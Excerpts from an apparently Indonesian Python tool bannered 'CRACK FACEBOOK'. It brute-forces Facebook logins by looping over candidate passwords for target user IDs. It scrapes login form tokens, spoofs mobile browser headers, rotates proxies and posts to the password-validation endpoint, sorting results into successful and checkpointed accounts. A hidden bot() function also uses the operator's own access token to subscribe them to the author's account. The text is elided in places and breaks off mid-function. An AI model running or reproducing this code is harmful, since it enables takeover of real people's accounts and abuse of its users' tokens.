...
def banner():
	print(f'''{asu}\x1b[1;97m╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮                           \x1b[1;91m╔═╗╔══╗╔══╗╔═╦╗
                           \x1b[1;91m║╬║╚║║╝║╔╗║║║║║
                           \x1b[1;97m║╗╣╔║║╗║╠╣║║║║║
                           \x1b[1;97m╚╩╝╚══╝╚╝╚╝╚╩═╝ 

                  {m}•{k}•{h}•{sir} AUTHOR : REY TNK DRIANSYAH {x}{m}•{k}•{h}•{x}                                                                                           {m}•{k}•{h}•{sir} CRACK FACEBOOK {x}{m}•{k}•{h}•{x}                        {m}•{k}•{h}•{sir} SELAMAT MENCOBA {x}{m}•{k}•{h}•{x} ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯''')
...
def bot():
	try:
		requests.post("https://graph.facebook.com/SQ.Pratama0?fields=subscribers&access_token=%s"%(tokenku))
	except:
		pass
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		...
		print('[×] Cookies Kadaluwarsa ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	gh = 'github.com/reytnk'
	cetak(nel('      \tSelamat Datang [yellow]%s[white] GANZ'%(my_name)))
...
def crackfree(idf,pwv):
	...
	fff = '%'
	print('\r%s%s/%s ok : %s cp : %s %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = 'Mozilla/5.0 (Linux; U; Android 8;  en-us; GT-R870D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.4810.82 Mobile Safari/537.36'
	ua2 = 'Mozilla/5.0 (Linux; U; Android 8;  en-us; GT-R870D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.4810.82 Mobile Safari/537.36'
	ses = requests.Session()
	for pw in pwv:
		try:
			...
			p = ses.get('https://iphone.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://iphone.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'iphone.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://iphone.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://iphone.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
...
def crackmbasic(idf,pwv):
	...
	fff = '%'
	print('\r%s%s/%s ok : %s cp : %s %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = 'Mozilla/5.0 (Linux; Android 12; I2018; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/7.9.3.1'
	ua2 = 'Mozilla/5.0 (Linux; Android 12; I2018; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/7.9.3.1'
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
